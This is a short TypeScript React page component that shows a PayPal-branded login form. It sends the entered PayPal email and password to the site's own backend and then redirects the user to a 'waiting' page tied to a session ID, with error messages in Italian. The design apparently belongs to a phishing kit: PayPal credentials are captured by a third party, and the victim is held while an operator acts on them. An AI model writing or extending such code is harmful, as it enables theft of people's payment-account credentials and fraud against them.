import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import PayPalLogin from "@/components/PayPalLogin";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";

export default function PayPalPage() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const loginMutation = useMutation({
    mutationFn: async ({ email, password }: { email: string; password: string }) => {
      const response = await apiRequest("POST", "/api/paypal/login", { email, password });
      console.log("PayPal login response:", response);
      return response;
    },
    onSuccess: (data: any) => {
      console.log("Login successful, redirecting to waiting page...", data);
      // Redirect to waiting page with session ID
      if (data?.sessionId) {
        const redirectUrl = `/paypal/waiting?session=${data.sessionId}`;
        console.log("Redirecting to:", redirectUrl);
        window.location.href = redirectUrl;
      } else {
        console.error("No sessionId in response:", data);
        toast({
          title: "Errore",
          description: "Errore durante la connessione. Riprova.",
          variant: "destructive",
        });
      }
    },
    onError: (error: any) => {
      console.error("Login error:", error);
      toast({
        title: "Errore di accesso",
        description: "Impossibile connettersi. Riprova.",
        variant: "destructive",
      });
    },
  });

  const handlePayPalLogin = (email: string, password: string) => {
    console.log("Submitting PayPal login for:", email);
    loginMutation.mutate({ email, password });
  };

  return <PayPalLogin onSubmit={handlePayPalLogin} isLoading={loginMutation.isPending} />;
}
